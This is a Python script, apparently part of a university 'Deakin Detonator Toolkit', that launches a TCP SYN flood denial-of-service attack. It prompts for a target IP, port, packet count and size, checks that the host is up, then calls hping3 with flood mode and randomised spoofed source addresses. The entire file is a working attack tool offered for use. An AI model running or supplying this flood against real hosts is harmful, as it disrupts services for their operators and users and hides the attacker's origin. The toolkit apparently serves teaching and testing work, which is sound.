#!/usr/bin/python
# -*- coding: utf-8 -*-

'''
REFERENCES
- Administrator (No date listed), How to Perform TCP SYN Flood DoS Attack & Detect it with Wireshark – Kali Linux hping3, GitHub, retrieved 03 May 2020, <http://www.firewall.cx/general-topics-reviews/network-protocol-analyzers/1224-performing-tcp-syn-flood-attack-and-detecting-it-with-wireshark.html>
'''

# Import modules
import sys, os, time
from scapy.all import *

# A function to test whether a given IP is up, returns true if up, false if down
def isUp(ip):
	icmp = IP(dst=ip)/ICMP()
	resp = sr1(icmp, timeout=2)
	
	if resp == None:
		return False
	else:
		return True

# The main function to start the tool
def SYN_FLOOD():
	# Use a try block to catch errors nicely
	try:
		# Clear the terminal for a clean screen
		os.system("clear")
		
		# Don't print out packet sending/receiving data for Scapy
		conf.verb = 0
		
		# Print a banner
		print("                                                              ")
		print("                        DOS: SYN Flood                        ")
		print("                   Deakin Detonator Toolkit                   ")
		print("                                                              ")

		# Get the user's input for the hping3 SYN flood input
		p_count = int(raw_input("\nHow many packets would you like to create? (default 10,000): ") or "10000")
		p_size = int(raw_input("\nHow big would you like the packets to be? (default 120 bytes): ") or "120")
		target_ip = raw_input("\nTarget's IP address: ")
		target_port = int(raw_input("\nTarget port (default 80): ") or "80")
		
		# Check if the specified target is up. If they are, continue, otherwise end the script
		if isUp(target_ip):
			# State that the host is up and how to stop the script
			print("\nHost {} is up. Starting SYN flood.\nPress CTRL+C to stop.\n".format(target_ip))
			
			# Get the current time to measure how long the flood lasts
			start_time = time.time()
			
			# Run the hping3 command to flood the target_ip with SYN packets from random source IP addresses
			os.system("hping3 -c {} -d {} -S -w 64 -p {} --flood --rand-source {}".format(p_count, p_size, target_port, target_ip))
			
			# When the user inputs the CTRL+C stop command, calculate the time the flood ran for
			duration = time.time() - start_time
			
			# State how long the flood was active for
			print("Flood was active for {} seconds.\n".format(duration))

		else:
			#State that the target host is down
			print("\nHost " + target_ip + " is down.")
	# If any error occurs, simply state that something went wrong and to try again
	except:
		print("Something went wrong. Please try again.")
